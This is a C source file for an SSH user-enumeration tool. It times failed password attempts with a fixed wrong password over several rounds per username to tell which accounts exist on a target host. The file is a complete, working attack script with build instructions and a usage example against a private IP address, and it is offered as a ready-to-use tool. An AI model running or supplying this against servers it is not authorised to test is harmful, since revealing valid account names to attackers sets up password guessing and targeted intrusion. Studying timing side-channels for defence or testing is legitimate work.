/*
 * SSH User Enumeration via Authentication Timing Side-Channel
 *
 * Measures the time taken for password authentication failure for each
 * username. Timing differences may reveal which users exist on the system
 * (PAM delay for valid users vs fast rejection for invalid ones).
 *
 * Build:
 *   macOS:  cc -o ssh_timing_enum ssh_timing_enum.c -lssh2 -I/opt/homebrew/include -L/opt/homebrew/lib
 *   Linux:  cc -o ssh_timing_enum ssh_timing_enum.c -lssh2
 *
 * Usage:
 *   ./ssh_timing_enum <host> [port] [rounds] < usernames.txt
 *   echo -e "root\ntest\nadmin\nfakeuser123" | ./ssh_timing_enum 192.168.0.129
 *
 * Output:
 *   Each line: username avg_ms min_ms max_ms round1_ms round2_ms ...
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <libssh2.h>

static double time_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static int connect_tcp(const char *host, int port)
{
    struct addrinfo hints = {0}, *res, *rp;
    char port_str[16];
    int sock = -1;

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0)
        return -1;

    for (rp = res; rp; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock < 0)
            continue;
        if (connect(sock, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    return sock;
}

static double measure_auth(const char *host, int port, const char *username)
{
    int sock;
    LIBSSH2_SESSION *session;
    double t0, t1;
    int rc;

    sock = connect_tcp(host, port);
    if (sock < 0)
        return -1.0;

    session = libssh2_session_init();
    if (!session) {
        close(sock);
        return -1.0;
    }

    libssh2_session_set_blocking(session, 1);

    rc = libssh2_session_handshake(session, sock);
    if (rc) {
        libssh2_session_free(session);
        close(sock);
        return -1.0;
    }

    /* Measure the password auth attempt */
    t0 = time_ms();
    rc = libssh2_userauth_password(session, username, "wrong_password_timing_probe");
    t1 = time_ms();

    libssh2_session_disconnect(session, "timing probe done");
    libssh2_session_free(session);
    close(sock);

    return t1 - t0;
}

int main(int argc, char *argv[])
{
    const char *host;
    int port = 22;
    int rounds = 5;
    char line[256];

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <host> [port] [rounds] < usernames.txt\n", argv[0]);
        fprintf(stderr, "\nReads usernames from stdin, one per line.\n");
        fprintf(stderr, "Output: username avg_ms min_ms max_ms round1_ms ...\n");
        return 1;
    }

    host = argv[1];
    if (argc > 2) port = atoi(argv[2]);
    if (argc > 3) rounds = atoi(argv[3]);
    if (rounds < 1) rounds = 1;
    if (rounds > 100) rounds = 100;

    if (libssh2_init(0) != 0) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }

    /* Print header */
    fprintf(stderr, "SSH Timing Probe: %s:%d (%d rounds per user)\n", host, port, rounds);
    fprintf(stderr, "Reading usernames from stdin...\n\n");
    printf("%-30s %8s %8s %8s", "username", "avg_ms", "min_ms", "max_ms");
    for (int r = 0; r < rounds; r++)
        printf(" %8s%d", "r", r + 1);
    printf("\n");

    while (fgets(line, sizeof(line), stdin)) {
        /* Strip newline */
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        nl = strchr(line, '\r');
        if (nl) *nl = '\0';

        if (line[0] == '\0' || line[0] == '#')
            continue;

        double times[100];
        double sum = 0, min_t = 1e9, max_t = 0;
        int ok = 0;

        for (int r = 0; r < rounds; r++) {
            double ms = measure_auth(host, port, line);
            if (ms < 0) {
                times[r] = -1;
                fprintf(stderr, "  %s: connection failed (round %d)\n", line, r + 1);
            } else {
                times[r] = ms;
                sum += ms;
                if (ms < min_t) min_t = ms;
                if (ms > max_t) max_t = ms;
                ok++;
            }
            /* Small delay between rounds */
            usleep(50000);
        }

        if (ok > 0) {
            double avg = sum / ok;
            printf("%-30s %8.1f %8.1f %8.1f", line, avg, min_t, max_t);
            for (int r = 0; r < rounds; r++) {
                if (times[r] >= 0)
                    printf(" %9.1f", times[r]);
                else
                    printf(" %9s", "ERR");
            }
            printf("\n");
            fflush(stdout);
        }
    }

    libssh2_exit();
    return 0;
}
